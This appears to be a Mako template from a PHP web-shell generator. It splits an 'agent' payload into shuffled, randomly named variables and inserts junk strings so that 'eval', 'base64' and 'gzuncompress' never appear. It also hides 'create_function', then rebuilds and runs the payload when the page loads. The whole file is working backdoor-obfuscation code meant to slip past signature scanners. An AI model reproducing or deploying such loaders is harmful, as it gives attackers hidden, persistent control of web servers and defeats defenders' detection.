<?php
<%!
import random
import itertools
from core import commons
import string
%><%
def find_substr_not_in_str(str, characters = string.letters + string.digits + '!"#$%&()*+,-./:;<=>?@[\\]^_`{|}~'):
	while True:
		substr = commons.randstr(2, False, characters)
		if not substr in str:
			return substr 

def obfuscate(str, obf, division, dangerous):
	while True:
		polluted = obf.join(list(commons.divide(str, 0, division, len(str)/division)))
		
		found = False
		for dang in dangerous:
			if dang in polluted:
				found = True
				
		if not found:
			return polluted

obfuscation_agent = find_substr_not_in_str(agent)
obfuscated_agent = obfuscate(agent, obfuscation_agent, 6, ('eval', 'base64', 'gzuncompress', 'gzcompress')) 

agent_splitted = list(commons.divide(obfuscated_agent, len(obfuscated_agent)/6-10, len(obfuscated_agent)/6-10, 6))

agent_variables = list(string.letters[:])
random.shuffle(agent_variables)
agent_variables_references = agent_variables[:]

agent_list = []
for line in agent_splitted:
	agent_list.append((agent_variables.pop(0), "'%s';" % line))

obfuscation_createfunc = find_substr_not_in_str('create_function', string.letters)
obfuscated_createfunc = obfuscate('create_function', obfuscation_createfunc, 2, ())

agent_list.append((agent_variables.pop(0), "str_replace('%s','','%s');" % (obfuscation_createfunc, obfuscated_createfunc)))

random.shuffle(agent_list)
%>
% for line in agent_list:
$${line[0]}=${line[1]}
% endfor
$${agent_variables.pop(0)}=str_replace('${obfuscation_agent}','',$${'.$'.join(agent_variables_references[:6])});
$${agent_variables.pop(0)}=$${agent_variables_references[6]}('',$${agent_variables_references[7]});$${agent_variables_references[8]}();
?>